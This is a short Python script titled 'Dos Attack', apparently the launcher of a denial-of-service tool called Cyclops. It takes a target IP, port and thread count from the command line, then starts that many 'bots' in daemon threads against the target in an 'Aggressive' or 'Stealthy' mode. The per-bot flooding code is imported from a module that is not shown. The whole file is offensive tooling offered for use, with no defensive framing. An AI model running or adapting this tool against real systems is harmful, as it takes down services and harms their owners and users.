# Date: 09/25/2018
# Author: Pure-L0G1C
# Description: Dos Attack

import socket
from lib.bot import Bot  
from lib.args import Args 
from threading import Thread 

class BotManager(object):

 def __init__(self, ip, port, is_aggressive, max_bots):
  self.bots = [Bot(ip, port, is_aggressive) for _ in range(max_bots)]
  self.is_alive = True
  self.port = port 
  self.ip = ip 

 def start(self):
  session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:session.connect((self.ip, self.port))
  except:
   print('Error: Unable to connect to the target. Proceeding anyway')

  for bot in self.bots:
   t = Thread(target=bot.start)
   t.daemon = True
   t.start()

 def stop(self):
  for bot in self.bots:
   t = Thread(target=bot.stop)
   t.daemon = True
   t.start()
  self.is_alive = False

class Cyclops(object):

 def __init__(self, ip, port, threads, is_aggressive):
  self.ip = ip
  self.port = port 
  self.threads = threads
  self.is_aggressive = is_aggressive
  self.bot_manager = BotManager(ip, port, is_aggressive, threads)

 def start(self):
  try:
   Thread(target=self.bot_manager.start, daemon=True).start()
   mode = 'Aggressive' if self.is_aggressive else 'Stealthy'
   print('Target: {}:{}\nMode: {}\nBots: {}'.format(self.ip, self.port, mode, self.threads))
   while self.bot_manager.is_alive:pass
  except KeyboardInterrupt:
   self.bot_manager.stop()

if __name__ == '__main__':
 args = Args()
 if args.set_args():
  Cyclops(args.ip, args.port, args.threads, args.is_aggressive).start()